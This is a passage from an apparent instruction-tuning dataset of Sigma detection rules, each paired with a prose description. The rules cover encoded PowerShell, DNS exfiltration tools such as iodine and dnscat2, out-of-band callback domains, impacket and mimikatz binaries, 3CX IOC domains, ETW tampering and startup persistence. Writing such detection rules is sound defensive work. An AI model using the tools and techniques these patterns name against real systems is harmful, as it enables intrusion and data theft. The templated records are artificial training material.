    "instruction": "Build a Sigma rule with the goal of detecting UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect UTF-8 and UTF-16 Base64 encoded PowerShell 'Invoke-' calls, you should identify when processes are created in a Windows environment that exhibit specific characteristics. Look for processes where the image name ends with either 'powershell.exe' or 'pwsh.exe', or where the original file name is noted as 'PowerShell.EXE' or 'pwsh.dll'. Additionally, focus on command lines that contain ' -e', which indicates the possibility of encoded commands. Furthermore, particular attention should be given to command lines containing patterns that match Base64 encoded versions of 'Invoke-' in both UTF-16LE and UTF-8 formats. These specific strings are indicative of potentially malicious encoded PowerShell commands being executed. It is important to consider all these selection criteria together to accurately detect malicious activities. However, be aware that there may be instances where these indicators might not necessarily point to malicious intent and could trigger false positives. The severity level for this detection rule is high, reflecting its significance in identifying potentially harmful activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_cli_enc:\n        CommandLine|contains: ' -e'\n    selection_cli_invoke:\n        CommandLine|contains:\n            # Invoke-\n            # UTF-16LE\n            - 'SQBuAHYAbwBrAGUALQ'\n            - 'kAbgB2AG8AawBlAC0A'\n            - 'JAG4AdgBvAGsAZQAtA'\n            # UTF-8\n            - 'SW52b2tlL'\n            - 'ludm9rZS'\n            - 'JbnZva2Ut'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_cli_enc:\n        CommandLine|contains: ' -e'\n    selection_cli_invoke:\n        CommandLine|contains:\n            # Invoke-\n            # UTF-16LE\n            - 'SQBuAHYAbwBrAGUALQ'\n            - 'kAbgB2AG8AawBlAC0A'\n            - 'JAG4AdgBvAGsAZQAtA'\n            # UTF-8\n            - 'SW52b2tlL'\n            - 'ludm9rZS'\n            - 'JbnZva2Ut'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls",
      "answer": "In order to detect UTF-8 and UTF-16 Base64 encoded PowerShell 'Invoke-' calls, you should identify when processes are created in a Windows environment that exhibit specific characteristics. Look for processes where the image name ends with either 'powershell.exe' or 'pwsh.exe', or where the original file name is noted as 'PowerShell.EXE' or 'pwsh.dll'. Additionally, focus on command lines that contain ' -e', which indicates the possibility of encoded commands. Furthermore, particular attention should be given to command lines containing patterns that match Base64 encoded versions of 'Invoke-' in both UTF-16LE and UTF-8 formats. These specific strings are indicative of potentially malicious encoded PowerShell commands being executed. It is important to consider all these selection criteria together to accurately detect malicious activities. However, be aware that there may be instances where these indicators might not necessarily point to malicious intent and could trigger false positives. The severity level for this detection rule is high, reflecting its significance in identifying potentially harmful activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting calls to hidden files or files located in hidden directories in NIX systems..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect calls to hidden files or files located in hidden directories in NIX systems, you should: Monitor audit logs on Linux systems for specific types of access requests to paths. Focus on requests where the pathname contains a period at the beginning, indicating a hidden file or directory. However, exclude from suspicion any access to paths commonly associated with benign activity, such as those within '/.cache/', '/.config/', '/.pyenv/', or '/.rustup/toolchains'. This approach aims to highlight potentially malicious activity while minimizing the alerting on ordinary system or application usage which might otherwise result in a false positive. Recognize that despite these measures, the ability to definitively classify an activity as benign or malicious based on this criterion alone is limited, leading to a low confidence level in the alerts generated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'PATH'\n        name|contains: '/.'\n    filter:\n        name|contains:\n            - '/.cache/'\n            - '/.config/'\n            - '/.pyenv/'\n            - '/.rustup/toolchains'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'PATH'\n        name|contains: '/.'\n    filter:\n        name|contains:\n            - '/.cache/'\n            - '/.config/'\n            - '/.pyenv/'\n            - '/.rustup/toolchains'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "calls to hidden files or files located in hidden directories in NIX systems.",
      "answer": "In order to detect calls to hidden files or files located in hidden directories in NIX systems, you should: Monitor audit logs on Linux systems for specific types of access requests to paths. Focus on requests where the pathname contains a period at the beginning, indicating a hidden file or directory. However, exclude from suspicion any access to paths commonly associated with benign activity, such as those within '/.cache/', '/.config/', '/.pyenv/', or '/.rustup/toolchains'. This approach aims to highlight potentially malicious activity while minimizing the alerting on ordinary system or application usage which might otherwise result in a false positive. Recognize that despite these measures, the ability to definitively classify an activity as benign or malicious based on this criterion alone is limited, leading to a low confidence level in the alerts generated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Well-known DNS Exfiltration tools execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of well-known DNS Exfiltration tools, you should focus on monitoring the process creation logs within Windows systems. Specifically, look out for any process executions where the image path ends with '\\iodine.exe' or contains '\\dnscat2'. Such indicators are strong signs of DNS-based data exfiltration attempts using known tools like Iodine and Dnscat2, which are often used by attackers to stealthily extract data from compromised networks. The likelihood of these activities being benign is very low, hence they are marked with a high severity level. Identifying these activities promptly can help in mitigating potential data loss through DNS queries.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "Well-known DNS Exfiltration tools execution",
      "answer": "In order to detect the execution of well-known DNS Exfiltration tools, you should focus on monitoring the process creation logs within Windows systems. Specifically, look out for any process executions where the image path ends with '\\iodine.exe' or contains '\\dnscat2'. Such indicators are strong signs of DNS-based data exfiltration attempts using known tools like Iodine and Dnscat2, which are often used by attackers to stealthily extract data from compromised networks. The likelihood of these activities being benign is very low, hence they are marked with a high severity level. Identifying these activities promptly can help in mitigating potential data loss through DNS queries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect attempt to enable auditing of TTY input.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_path_events:\n        type: PATH\n        name:\n            - '/etc/pam.d/system-auth'\n            - '/etc/pam.d/password-auth'\n    selection_tty_events:\n        type:\n            - 'TTY'\n            - 'USER_TTY'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative work\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_path_events:\n        type: PATH\n        name:\n            - '/etc/pam.d/system-auth'\n            - '/etc/pam.d/password-auth'\n    selection_tty_events:\n        type:\n            - 'TTY'\n            - 'USER_TTY'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative work\nlevel: high\n",
      "question": "Detect attempt to enable auditing of TTY input",
      "answer": "In order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful Remote Code Execution (RCE), you should:\nMonitor DNS query logs for any requests that contain specific domain names known to be associated with external service interactions. These domains include '.interact.sh', '.oast.pro', '.oast.live', '.oast.site', '.oast.online', '.oast.fun', '.oast.me', '.burpcollaborator.net', '.oastify.com', '.canarytokens.com', '.requestbin.net', and '.dnslog.cn'. Any DNS queries containing these domains should be flagged as suspicious because they are often used by attackers for out-of-band data exfiltration or command and control (C2) communications following a successful RCE attack. The level of concern for such detections is categorized as high due to the potential implications of such activity indicating a breach. However, it's important to note there may be unknown false positives, and each detection should be thoroughly investigated to confirm malicious activity. This approach is aligned with detecting techniques categorized under the MITRE ATT&CK tactics of command and control, and exfiltration, aiming to identify and mitigate potential threats as early as possible.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: dns\ndetection:\n    selection:\n        query|contains:\n            - '.interact.sh'\n            - '.oast.pro'\n            - '.oast.live'\n            - '.oast.site'\n            - '.oast.online'\n            - '.oast.fun'\n            - '.oast.me'\n            - '.burpcollaborator.net'\n            - '.oastify.com'\n            - '.canarytokens.com'\n            - '.requestbin.net'\n            - '.dnslog.cn'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: dns\ndetection:\n    selection:\n        query|contains:\n            - '.interact.sh'\n            - '.oast.pro'\n            - '.oast.live'\n            - '.oast.site'\n            - '.oast.online'\n            - '.oast.fun'\n            - '.oast.me'\n            - '.burpcollaborator.net'\n            - '.oastify.com'\n            - '.canarytokens.com'\n            - '.requestbin.net'\n            - '.dnslog.cn'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE",
      "answer": "In order to detect suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful Remote Code Execution (RCE), you should:\nMonitor DNS query logs for any requests that contain specific domain names known to be associated with external service interactions. These domains include '.interact.sh', '.oast.pro', '.oast.live', '.oast.site', '.oast.online', '.oast.fun', '.oast.me', '.burpcollaborator.net', '.oastify.com', '.canarytokens.com', '.requestbin.net', and '.dnslog.cn'. Any DNS queries containing these domains should be flagged as suspicious because they are often used by attackers for out-of-band data exfiltration or command and control (C2) communications following a successful RCE attack. The level of concern for such detections is categorized as high due to the potential implications of such activity indicating a breach. However, it's important to note there may be unknown false positives, and each detection should be thoroughly investigated to confirm malicious activity. This approach is aligned with detecting techniques categorized under the MITRE ATT&CK tactics of command and control, and exfiltration, aiming to identify and mitigate potential threats as early as possible."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives), you should: Monitor the creation of processes on Windows systems for any instances where the name of the executable file indicates it could be part of the impacket collection of networking tools. Specifically, look out for files named or containing certain key strings such as 'goldenPac', 'karmaSMB', 'kintercept', 'ntlmrelayx', 'rpcdump', 'samrdump', 'secretsdump', 'smbexec', 'smbrelayx', 'wmiexec', 'wmipersist' or ending with 'atexec_windows.exe', 'dcomexec_windows.exe', 'dpapi_windows.exe', 'findDelegation_windows.exe', 'GetADUsers_windows.exe', 'GetNPUsers_windows.exe', 'getPac_windows.exe', 'getST_windows.exe', 'getTGT_windows.exe', 'GetUserSPNs_windows.exe', 'ifmap_windows.exe', 'mimikatz_windows.exe', 'netview_windows.exe', 'nmapAnswerMachine_windows.exe', 'opdump_windows.exe', 'psexec_windows.exe', 'rdp_check_windows.exe', 'sambaPipe_windows.exe', 'smbclient_windows.exe', 'smbserver_windows.exe', 'sniffer_windows.exe', 'sniff_windows.exe', 'split_windows.exe', 'ticketer_windows.exe'. Be aware that, while these detections are highly indicative of impacket toolset usage, they may also flag legitimate uses of these tools, thus careful analysis is required to distinguish between malicious activity and approved operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|contains:\n            - '\\goldenPac'\n            - '\\karmaSMB'\n            - '\\kintercept'\n            - '\\ntlmrelayx'\n            - '\\rpcdump'\n            - '\\samrdump'\n            - '\\secretsdump'\n            - '\\smbexec'\n            - '\\smbrelayx'\n            - '\\wmiexec'\n            - '\\wmipersist'\n        - Image|endswith:\n            # - '\\addcomputer_windows.exe'\n            - '\\atexec_windows.exe'\n            - '\\dcomexec_windows.exe'\n            - '\\dpapi_windows.exe'\n            # - '\\esentutl_windows.exe'\n            - '\\findDelegation_windows.exe'\n            - '\\GetADUsers_windows.exe'\n            # - '\\getArch_windows.exe'\n            - '\\GetNPUsers_windows.exe'\n            - '\\getPac_windows.exe'\n            - '\\getST_windows.exe'\n            - '\\getTGT_windows.exe'\n            - '\\GetUserSPNs_windows.exe'\n            - '\\ifmap_windows.exe'\n            # - '\\lookupsid_windows.exe'\n            - '\\mimikatz_windows.exe'\n            # - '\\mqtt_check_windows.exe'\n            # - '\\mssqlclient_windows.exe'\n            # - '\\mssqlinstance_windows.exe'\n            - '\\netview_windows.exe'\n            - '\\nmapAnswerMachine_windows.exe'\n            #- '\\ntfs-read_windows.exe'\n            - '\\opdump_windows.exe'\n            # - '\\ping6_windows.exe'\n            # - '\\ping_windows.exe'\n            - '\\psexec_windows.exe'\n            # - '\\raiseChild_windows.exe'\n            - '\\rdp_check_windows.exe'\n            #- '\\registry-read_windows.exe'\n            #- '\\reg_windows.exe'\n            - '\\sambaPipe_windows.exe'\n            # - '\\services_windows.exe'\n            - '\\smbclient_windows.exe'\n            - '\\smbserver_windows.exe'\n            - '\\sniffer_windows.exe'\n            - '\\sniff_windows.exe'\n            - '\\split_windows.exe'\n            - '\\ticketer_windows.exe'\n            # - '\\wmiquery_windows.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the impacket tools\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|contains:\n            - '\\goldenPac'\n            - '\\karmaSMB'\n            - '\\kintercept'\n            - '\\ntlmrelayx'\n            - '\\rpcdump'\n            - '\\samrdump'\n            - '\\secretsdump'\n            - '\\smbexec'\n            - '\\smbrelayx'\n            - '\\wmiexec'\n            - '\\wmipersist'\n        - Image|endswith:\n            # - '\\addcomputer_windows.exe'\n            - '\\atexec_windows.exe'\n            - '\\dcomexec_windows.exe'\n            - '\\dpapi_windows.exe'\n            # - '\\esentutl_windows.exe'\n            - '\\findDelegation_windows.exe'\n            - '\\GetADUsers_windows.exe'\n            # - '\\getArch_windows.exe'\n            - '\\GetNPUsers_windows.exe'\n            - '\\getPac_windows.exe'\n            - '\\getST_windows.exe'\n            - '\\getTGT_windows.exe'\n            - '\\GetUserSPNs_windows.exe'\n            - '\\ifmap_windows.exe'\n            # - '\\lookupsid_windows.exe'\n            - '\\mimikatz_windows.exe'\n            # - '\\mqtt_check_windows.exe'\n            # - '\\mssqlclient_windows.exe'\n            # - '\\mssqlinstance_windows.exe'\n            - '\\netview_windows.exe'\n            - '\\nmapAnswerMachine_windows.exe'\n            #- '\\ntfs-read_windows.exe'\n            - '\\opdump_windows.exe'\n            # - '\\ping6_windows.exe'\n            # - '\\ping_windows.exe'\n            - '\\psexec_windows.exe'\n            # - '\\raiseChild_windows.exe'\n            - '\\rdp_check_windows.exe'\n            #- '\\registry-read_windows.exe'\n            #- '\\reg_windows.exe'\n            - '\\sambaPipe_windows.exe'\n            # - '\\services_windows.exe'\n            - '\\smbclient_windows.exe'\n            - '\\smbserver_windows.exe'\n            - '\\sniffer_windows.exe'\n            - '\\sniff_windows.exe'\n            - '\\split_windows.exe'\n            - '\\ticketer_windows.exe'\n            # - '\\wmiquery_windows.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the impacket tools\nlevel: high\n",
      "question": "execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)",
      "answer": "In order to detect the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives), you should: Monitor the creation of processes on Windows systems for any instances where the name of the executable file indicates it could be part of the impacket collection of networking tools. Specifically, look out for files named or containing certain key strings such as 'goldenPac', 'karmaSMB', 'kintercept', 'ntlmrelayx', 'rpcdump', 'samrdump', 'secretsdump', 'smbexec', 'smbrelayx', 'wmiexec', 'wmipersist' or ending with 'atexec_windows.exe', 'dcomexec_windows.exe', 'dpapi_windows.exe', 'findDelegation_windows.exe', 'GetADUsers_windows.exe', 'GetNPUsers_windows.exe', 'getPac_windows.exe', 'getST_windows.exe', 'getTGT_windows.exe', 'GetUserSPNs_windows.exe', 'ifmap_windows.exe', 'mimikatz_windows.exe', 'netview_windows.exe', 'nmapAnswerMachine_windows.exe', 'opdump_windows.exe', 'psexec_windows.exe', 'rdp_check_windows.exe', 'sambaPipe_windows.exe', 'smbclient_windows.exe', 'smbserver_windows.exe', 'sniffer_windows.exe', 'sniff_windows.exe', 'split_windows.exe', 'ticketer_windows.exe'. Be aware that, while these detections are highly indicative of impacket toolset usage, they may also flag legitimate uses of these tools, thus careful analysis is required to distinguish between malicious activity and approved operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor proxy logs for traffic to specific hostnames that exhibit characteristics of malicious communication. This detection strategy involves scrutinizing the hostnames within proxy logs to identify any traffic directed towards a list of suspicious domain names. These domains include 'akamaicontainer.com', 'akamaitechcloudservices.com', 'azuredeploystore.com', 'azureonlinecloud.com', 'azureonlinestorage.com', 'dunamistrd.com', 'glcloudservice.com', 'journalide.org', 'msedgepackageinfo.com', 'msstorageazure.com', 'msstorageboxes.com', 'officeaddons.com', 'officestoragebox.com', 'pbxcloudeservices.com', 'pbxphonenetwork.com', 'pbxsources.com', 'qwepoi123098.com', 'sbmsa.wiki', 'sourceslabs.com', 'visualstudiofactory.com', and 'zacharryblogs.com'. Monitoring for communication with these domains is crucial as they have been identified as indicators of compromise associated with malicious activity related to the 3CX 3CXDesktopApp. Ensuring vigilant monitoring and analysis of proxy logs for these signs can aid in early detection of potential threats, facilitating timely response measures to mitigate any adverse impacts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-host|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-host|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise",
      "answer": "In order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor proxy logs for traffic to specific hostnames that exhibit characteristics of malicious communication. This detection strategy involves scrutinizing the hostnames within proxy logs to identify any traffic directed towards a list of suspicious domain names. These domains include 'akamaicontainer.com', 'akamaitechcloudservices.com', 'azuredeploystore.com', 'azureonlinecloud.com', 'azureonlinestorage.com', 'dunamistrd.com', 'glcloudservice.com', 'journalide.org', 'msedgepackageinfo.com', 'msstorageazure.com', 'msstorageboxes.com', 'officeaddons.com', 'officestoragebox.com', 'pbxcloudeservices.com', 'pbxphonenetwork.com', 'pbxsources.com', 'qwepoi123098.com', 'sbmsa.wiki', 'sourceslabs.com', 'visualstudiofactory.com', and 'zacharryblogs.com'. Monitoring for communication with these domains is crucial as they have been identified as indicators of compromise associated with malicious activity related to the 3CX 3CXDesktopApp. Ensuring vigilant monitoring and analysis of proxy logs for these signs can aid in early detection of potential threats, facilitating timely response measures to mitigate any adverse impacts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to environment variables related to ETW logging. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to environment variables related to ETW logging, which could indicate potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should: monitor the creation of processes on Windows systems, specifically looking for the presence of 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' in the command line arguments. These particular strings are associated with environment variables that control ETW (Event Tracing for Windows) logging settings for .NET applications. A change or manipulation of these could suggest an attempt to evade detection by disabling logging of .NET assembly loads. Such activities are considered highly suspicious and are unlikely to produce false positives, highlighting the significance of detecting these specific command line arguments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'COMPlus_ETWEnabled'\n            - 'COMPlus_ETWFlags'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'COMPlus_ETWEnabled'\n            - 'COMPlus_ETWFlags'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "changes to environment variables related to ETW logging. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.",
      "answer": "In order to detect changes to environment variables related to ETW logging, which could indicate potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should: monitor the creation of processes on Windows systems, specifically looking for the presence of 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' in the command line arguments. These particular strings are associated with environment variables that control ETW (Event Tracing for Windows) logging settings for .NET applications. A change or manipulation of these could suggest an attempt to evade detection by disabling logging of .NET assembly loads. Such activities are considered highly suspicious and are unlikely to produce false positives, highlighting the significance of detecting these specific command line arguments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect modification of the startup key to a path where a payload could be stored to be launched during startup.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of the startup key to a path where a payload could be stored to be launched during startup, you should monitor the Windows registry for any setting changes specifically within the 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' key. Look for events where the EventType is 'SetValue'. This indicates that a value within a registry key has been modified. Furthermore, focus on changes where the TargetObject ends with 'Startup', encompassing both the Common Startup folder and individual user Startup folders. This is critical as malicious actors often target these registry keys to ensure their payload executes during system startup, achieving persistence on the compromised system. False positives might arise in situations where legitimate software or administrators make changes to these startup keys, which are currently considered unknown. The importance of monitoring these registry modifications is rated as high due to the potential for misuse by adversaries to gain persistent access and execute unauthorized code automatically upon system boot.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n        TargetObject|endswith: 'Startup' # cover Common Startup and Startup\n        # can use Details|contains: path if get too many FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n        TargetObject|endswith: 'Startup' # cover Common Startup and Startup\n        # can use Details|contains: path if get too many FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup",
      "answer": "In order to detect modification of the startup key to a path where a payload could be stored to be launched during startup, you should monitor the Windows registry for any setting changes specifically within the 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' key. Look for events where the EventType is 'SetValue'. This indicates that a value within a registry key has been modified. Furthermore, focus on changes where the TargetObject ends with 'Startup', encompassing both the Common Startup folder and individual user Startup folders. This is critical as malicious actors often target these registry keys to ensure their payload executes during system startup, achieving persistence on the compromised system. False positives might arise in situations where legitimate software or administrators make changes to these startup keys, which are currently considered unknown. The importance of monitoring these registry modifications is rated as high due to the potential for misuse by adversaries to gain persistent access and execute unauthorized code automatically upon system boot."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a service installation of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky, you should:\nMonitor Windows system logs for activities associated with the Service Control Manager. Specifically, look out for an event with an ID of 7045, which indicates a service was installed on the system. This event should relate to a service named \"NtsSrv\" and the path to the service\u2019s executable should end with ' LocalService'. Such events are of high concern due to their rarity and potential indication of a malicious activity, as legitimate uses of the service name and executable path pattern described are unlikely. This monitoring strategy is essential for identifying tactics and techniques akin to those used in sophisticated malware operations, particularly those documented in threats like the StoneDrill malware.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: NtsSrv\n        ImagePath|endswith: ' LocalService'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: NtsSrv\n        ImagePath|endswith: ' LocalService'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky",
      "answer": "In order to detect a service installation of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky, you should:\nMonitor Windows system logs for activities associated with the Service Control Manager. Specifically, look out for an event with an ID of 7045, which indicates a service was installed on the system. This event should relate to a service named \"NtsSrv\" and the path to the service\u2019s executable should end with ' LocalService'. Such events are of high concern due to their rarity and potential indication of a malicious activity, as legitimate uses of the service name and executable path pattern described are unlikely. This monitoring strategy is essential for identifying tactics and techniques akin to those used in sophisticated malware operations, particularly those documented in threats like the StoneDrill malware."
    }
  },
  {
